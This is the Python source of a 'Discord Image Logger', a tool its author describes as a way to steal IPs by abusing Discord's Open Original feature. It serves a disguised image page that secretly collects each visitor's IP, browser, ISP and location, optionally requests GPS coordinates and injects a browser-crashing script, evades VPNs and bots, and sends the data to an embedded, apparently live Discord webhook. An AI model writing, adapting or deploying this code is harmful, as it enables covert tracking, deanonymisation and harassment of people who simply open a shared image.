# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1134328424345903145/yJ7nDNPe-YzzpdTGn3tBvtpySXVCstlULRUJMCOm_A2he0R1BZ8yZVbxxK2gOwwVsaDe
    https://discord.com/api/webhooks/your/webhook",
    "image": "data:image/jpeg;base64,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https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)


    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
